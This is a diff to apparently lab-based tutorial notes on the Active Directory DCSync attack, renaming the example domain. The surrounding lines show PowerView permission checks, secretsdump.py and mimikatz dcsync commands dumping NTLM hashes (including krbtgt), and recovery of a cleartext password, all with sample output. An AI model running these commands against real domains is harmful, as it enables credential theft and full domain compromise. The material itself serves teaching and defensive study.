@@ -26,17 +26,17 @@ PowerView can be used to confirm that a user has the necessary replication permi
 ```powershell
 $sid = "{sid-here}"
 
-Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+Get-ObjectAcl "DC=echoridge,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
 
 
 AceQualifier          : AccessAllowed
-ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ObjectDN              : DC=echoridge,DC=LOCAL
 ActiveDirectoryRights : ExtendedRight
 SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
 ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
 
 AceQualifier          : AccessAllowed
-ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ObjectDN              : DC=echoridge,DC=LOCAL
 ActiveDirectoryRights : ExtendedRight
 SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
 ObjectAceType         : DS-Replication-Get-Changes
@@ -50,10 +50,10 @@ If we had certain rights over the user (such as [WriteDacl](https://bloodhound.r
 
 ### Using secretsdump.py (Linux)
 
-Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+Running the tool as below will write all hashes to files with the prefix `echoridge_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
 
 ```shell
-$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+$ secretsdump.py -outputfile echoridge_hashes -just-dc echoridge/adunn@172.16.5.5 
 
 [*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
 [*] Searching for NTDS.dit
@@ -83,9 +83,9 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
 Mimikatz must be run in the context of the user who has DCSync privileges. Use `runas.exe` to accomplish this:
 
 ```cmd
-C:\> runas /netonly /user:INLANEFREIGHT\adunn powershell
-Enter the password for INLANEFREIGHT\adunn:
-Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
+C:\> runas /netonly /user:echoridge\adunn powershell
+Enter the password for echoridge\adunn:
+Attempting to start powershell as user "echoridge\adunn" ...
 ```
 
 From the newly spawned powershell session, perform the attack:
@@ -96,10 +96,10 @@ PS C:\> .\mimikatz.exe
 mimikatz # privilege::debug
 Privilege '20' OK
 
-mimikatz # lsadump::dcsync /domain:echoridge.local /user:INLANEFREIGHT\administrator
+mimikatz # lsadump::dcsync /domain:echoridge.local /user:echoridge\administrator
 [DC] 'echoridge.local' will be the domain
 [DC] 'ACADEMY-EA-DC01.echoridge.local' will be the DC server
-[DC] 'INLANEFREIGHT\administrator' will be the user account
+[DC] 'echoridge\administrator' will be the user account
 
 Object RDN           : Administrator
 
@@ -149,7 +149,7 @@ Using Get-ADUser:
 ```powershell
 Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 
-DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=echoridge,DC=LOCAL
 Enabled            : True
 Name               : PROXYAGENT
 SamAccountName     : proxyagent
@@ -169,7 +169,7 @@ proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
 
 The tool will decrypt the password and provide the cleartext value:
 ```shell
-$ cat inlanefreight_hashes.ntds.cleartext 
+$ cat echoridge_hashes.ntds.cleartext 
 
 proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
 ```
